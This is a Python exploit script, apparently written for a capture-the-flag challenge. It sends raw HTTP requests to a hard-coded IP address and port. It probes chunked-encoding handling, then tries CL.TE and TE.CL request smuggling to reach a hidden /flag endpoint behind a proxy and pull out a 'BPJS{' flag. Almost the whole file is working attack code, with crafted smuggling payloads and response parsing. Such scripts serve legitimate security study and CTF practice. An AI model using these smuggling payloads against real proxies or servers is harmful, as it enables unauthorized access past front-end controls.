#!/usr/bin/env python3
"""
Test chunked encoding behavior
"""

import socket
import struct

HOST = "210.79.190.102"
PORT = 8081

def test_force_chunked_response():
    """
    Try to force the server to send a chunked response
    """
    print("[*] Testing if we can get chunked response...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((HOST, PORT))
        
        # Try different techniques to get chunked response
        # 1. Request with HTTP/1.1, no Content-Length expected
        # 2. Use Transfer-Encoding: chunked in request
        # 3. Request a large response that might be chunked
        
        # Technique 1: Request with chunked encoding
        request = b"""GET /content/41414141 HTTP/1.1\r
Host: localhost\r
Transfer-Encoding: chunked\r
Connection: close\r
\r
0\r
\r
"""
        
        print("[*] Sending request with Transfer-Encoding: chunked...")
        sock.send(request)
        
        response = b""
        chunks = []
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                chunks.append(data)
                if len(response) > 10000:
                    break
            except socket.timeout:
                break
            except:
                break
        
        print(f"[+] Received {len(response)} bytes in {len(chunks)} chunks")
        print(f"[+] Response headers:\n{response[:500].decode('utf-8', errors='ignore')}")
        
        # Check for chunked encoding in response
        response_str = response.decode('utf-8', errors='ignore')
        if "Transfer-Encoding: chunked" in response_str or "transfer-encoding: chunked" in response_str.lower():
            print("[!] Response is chunked!")
            # The proxy should have read it incorrectly
            # Let's see what the proxy returned
            print(f"[*] Full response:\n{response_str}")
        else:
            print("[*] Response is not chunked (has Content-Length)")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()

def test_chunked_request_smuggling():
    """
    Test HTTP request smuggling with chunked encoding
    """
    print("\n[*] Testing chunked request smuggling...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((HOST, PORT))
        
        # CL.TE: Send Content-Length that's wrong, but Transfer-Encoding: chunked
        # The proxy uses Content-Length, backend might use Transfer-Encoding
        
        # Smuggle a request to /flag
        # First request: POST /login with chunked body
        # Second request: GET /flag (smuggled)
        
        # The chunked body should be:
        # 0\r\n\r\n (end of first request)
        # Then the smuggled request
        
        smuggled = b"""POST /login HTTP/1.1\r
Host: localhost\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 100\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /flag HTTP/1.1\r
Host: localhost\r
\r
"""
        
        print("[*] Sending CL.TE smuggled request...")
        sock.send(smuggled)
        
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                if len(response) > 20000:
                    break
            except:
                break
        
        print(f"[+] Response ({len(response)} bytes):")
        print(response.decode('utf-8', errors='ignore')[:1500])
        
        # Check for flag
        if b"BPJS{" in response:
            flag_start = response.find(b"BPJS{")
            flag_end = response.find(b"}", flag_start) + 1
            flag = response[flag_start:flag_end].decode('utf-8')
            print(f"\n[+] FLAG FOUND: {flag}")
            return flag
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    
    return None

def test_te_cl_smuggling():
    """
    TE.CL attack: Frontend uses Transfer-Encoding, backend uses Content-Length
    """
    print("\n[*] Testing TE.CL smuggling...")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((HOST, PORT))
        
        # TE.CL: Send Transfer-Encoding: chunked, but also Content-Length
        # Frontend (proxy) might use Transfer-Encoding, backend uses Content-Length
        
        # The proxy doesn't handle Transfer-Encoding in requests!
        # It only checks Content-Length (line 240)
        # So if we send Transfer-Encoding: chunked without Content-Length,
        # the proxy won't read the body at all!
        
        # But if we send both, the proxy will use Content-Length
        # And forward both headers to backend
        # Backend might use Transfer-Encoding
        
        # Let's try: Send chunked body that ends early
        # Then smuggle another request
        
        # Chunked format: size in hex\r\n data\r\n
        # To end: 0\r\n\r\n
        
        # First request body: "0\r\n\r\n" (empty chunk, ends request)
        # Then smuggled request
        
        smuggled = b"""POST /login HTTP/1.1\r
Host: localhost\r
Content-Type: application/x-www-form-urlencoded\r
Transfer-Encoding: chunked\r
Content-Length: 4\r
\r
0\r
\r
GET /flag HTTP/1.1\r
Host: localhost\r
\r
"""
        
        print("[*] Sending TE.CL smuggled request...")
        sock.send(smuggled)
        
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                if len(response) > 20000:
                    break
            except:
                break
        
        print(f"[+] Response ({len(response)} bytes):")
        print(response.decode('utf-8', errors='ignore')[:1500])
        
        if b"BPJS{" in response:
            flag_start = response.find(b"BPJS{")
            flag_end = response.find(b"}", flag_start) + 1
            flag = response[flag_start:flag_end].decode('utf-8')
            print(f"\n[+] FLAG FOUND: {flag}")
            return flag
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    
    return None

if __name__ == "__main__":
    print("=" * 70)
    print("Chunked Encoding Exploit Tests")
    print("=" * 70)
    
    test_force_chunked_response()
    result = test_chunked_request_smuggling()
    if not result:
        result = test_te_cl_smuggling()
    
    if result:
        print(f"\n[+] SUCCESS! Flag: {result}")
    else:
        print("\n[-] No flag found. Need to try different approach.")



